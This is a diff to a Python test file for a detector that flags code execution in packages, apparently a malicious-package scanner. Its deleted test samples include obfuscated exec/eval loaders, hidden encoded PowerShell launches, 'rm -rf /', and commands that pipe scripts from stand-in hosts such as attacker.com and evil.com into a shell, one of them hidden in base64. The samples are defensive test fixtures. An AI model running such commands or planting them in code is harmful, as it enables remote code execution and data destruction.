@@ -1,14 +1,15 @@
-"""Tests for code-execution rule
+""" Tests for code-execution rule
 
-OK cases:
-    - Executing python files to extract version information
-    - Os.system used for setup purposes
-    - Executing git commands
-RULEID cases:
-    - executing bash commands
+    OK cases:
+        - Executing python files to extract version information
+        - Os.system used for setup purposes
+        - Executing git commands
+    RULEID cases:
+        - executing bash commands
 """
 
-""" OK: Executing python files to extract version information
+
+""" OK: Executing python files to extract version information 
 """
 # ok: code-execution
 exec(open("vapory_git/version.py").read())  # loads __version__
@@ -56,9 +57,7 @@ def get_version():
 call(["python", "-m", "unittest", "discover"])
 
 # ok: code-execution
-subprocess.check_output(["pkg-config", optional_args, pkg_option, package]).decode(
-    "utf8"
-).split()
+subprocess.check_output(["pkg-config", optional_args, pkg_option, package]).decode("utf8").split()
 
 # ok: code-execution
 os.system("python setup.py sdist bdist_wheel")
@@ -99,17 +98,15 @@ docker_build = subprocess.Popen(
 
 def RunCustomCommand(command_list):
     print("Running command: %s" % command_list)
-    # ruleid: code-execution
-    p = subprocess.Popen(
-        command_list,
-        stdin=subprocess.PIPE,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT,
-    )
+    # ok: code-execution
+    p = subprocess.Popen(command_list, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 
 
 # ok: code-execution
 subprocess.run(["python3", "-m", "pycodestyle", "."], env=env, check=True)
+
+# ok: code-execution
+p = subprocess.Popen([pkg_config, option, "libffi"])
 
 # ok: code-execution
 os.system("coverage report")
@@ -140,10 +137,10 @@ popen("cd %s && git init " % TEST_MODULES_ROOT)
 subprocess.check_output(["git", "describe", "--tags"]).strip()
 
 
-""" RULEID: executing bash commands
+""" RULEID: executing bash commands 
 """
 # ruleid: code-execution
-os.system("start " + filename)
+os.system('start ' + filename)
 
 # ruleid: code-execution
 os.system(
@@ -171,121 +168,12 @@ if line.startswith("DANGEROUS"):
 
 
 # ruleid: code-execution
-__import__("builtins").exec(
-    __import__("builtins").compile(
-        __import__("base64").b64decode("foo"), "<string>", "exec"
-    )
-)
+__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("foo"),'<string>','exec'))
 
 
-from builtins import *
-
+from builtins import *;
 # ruleid: code-execution
-(
-    OOO0O0OOOOO000oOo0oOoOo0,
-    llIIlIlllllIlIlIlll,
-    Oo000O0OO0oO0oO00oO0oO0O,
-    WXWXXWWXXWXWXWWXXXWXXWX,
-    XWWWWXXXXWWWWWXXWWX,
-) = (lambda SS2S222S22SS22S22S: SS2S222S22SS22S22S(__import__("\x7a\x6c\x69\x62"))), (
-    lambda SS2S222S22SS22S22S: globals()["\x65\x76\x61\x6c"](
-        globals()["\x63\x6f\x6d\x70\x69\x6c\x65"](globals()["\x73\x74\x72"])
-    )
-)
+OOO0O0OOOOO000oOo0oOoOo0,llIIlIlllllIlIlIlll,Oo000O0OO0oO0oO00oO0oO0O,WXWXXWWXXWXWXWWXXXWXXWX,XWWWWXXXXWWWWWXXWWX=(lambda SS2S222S22SS22S22S:SS2S222S22SS22S22S(__import__('\x7a\x6c\x69\x62'))),(lambda SS2S222S22SS22S22S:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72'])))
 
 # ok: code-execution
 errno = subprocess.call([sys.executable, "tests.py"])
-
-
-"""
-https://github.com/DataDog/guarddog/issues/178
-"""
-# ruleid: code-execution
-subprocess.Popen(
-    "powershell -WindowStyle Hidden -EncodedCommand cABvAHc..",
-    shell=False,
-    creationflags=subprocess.CREATE_NO_WINDOW,
-)
-
-# ruleid: code-execution
-os.popen("powershell foo", stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-
-"""
-https://www.kroll.com/en/insights/publications/cyber/pypi-packages-deliver-python-remote-access-tools
-"""
-
-
-def run_file(path):
-    # pass
-    # os.system(path)
-    print("Running")
-    # ruleid: code-execution
-    p = subprocess.Popen(
-        f"python {path}",
-        shell=True,
-        stdin=None,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
-        close_fds=True,
-    )
-    out, err = p.communicate()
-
-
-# ruleid: code-execution
-subprocess.check_call(["rm", "-rf", "target_dir"], cwd="/tmp")
-
-# ok: code-execution
-subprocess.check_call(["cmake", "--build", "."])
-
-
-class install_ext_solibs(install_lib):
-    def run(self):
-        super().run()
-        for wheel in glob.glob("build/bdist.*/wheel"):
-            for solib in os.listdir(wheel):
-                for mext in re.finditer("^([^/]*).cpython.*", solib):
-                    if not mext.group(1) in templates:
-                        # ruleid: code-execution
-                        self.spawn(["rm", "-f", f"{wheel}/{solib}"])
-
-"""
-compile() and vars() indirection patterns
-"""
-# ruleid: code-execution
-vars(__builtins__)['exec']("subprocess.call('/tmp/malware')")
-
-# ruleid: code-execution
-vars(__builtins__)['eval']("__import__('os').system('wget http://malicious.com/backdoor.sh')")
-
-# ruleid: code-execution
-vars(__builtins__)['compile']("os.system('malicious')", '<string>', 'exec')
-
-# ruleid: code-execution
-vars(__builtins__).get('exec')("subprocess.Popen('powershell -WindowStyle Hidden', shell=True)")
-
-# ruleid: code-execution
-vars(__builtins__).get('eval')("__import__('os').popen('curl http://attacker.com | sh')")
-
-# ruleid: code-execution
-vars(__builtins__).get('compile')("os.system('rm -rf /')", '<string>', 'exec')
-
-# ruleid: code-execution
-vars(globals()['__builtins__'])['exec']("os.system('malicious command')")
-
-# ruleid: code-execution
-vars(globals()['__builtins__'])['eval']("subprocess.Popen('backdoor', shell=True)")
-
-# ruleid: code-execution
-vars(locals()['__builtins__'])['exec']("subprocess.check_call(['rm', '-rf', '/'])")
-
-# ruleid: code-execution
-vars(locals()['__builtins__'])['eval']("os.popen('curl http://attacker.com/keylogger.py')")
-
-# ruleid: code-execution
-compile(__import__('base64').b64decode('ZXhlYyhfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnZWNobyBtYWx3YXJlJykp'), '<string>', 'exec')
-
-# ruleid: code-execution
-compile("subprocess.Popen('powershell -EncodedCommand cABvAHc=', shell=False)", '<string>', 'eval')
-
-# ruleid: code-execution
-vars(__builtins__)['eval'](compile(__import__('base64').b64decode("X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2N1cmwgaHR0cDovL2V2aWwuY29tIHwgc2gnKQ=="), '<string>', 'exec'))
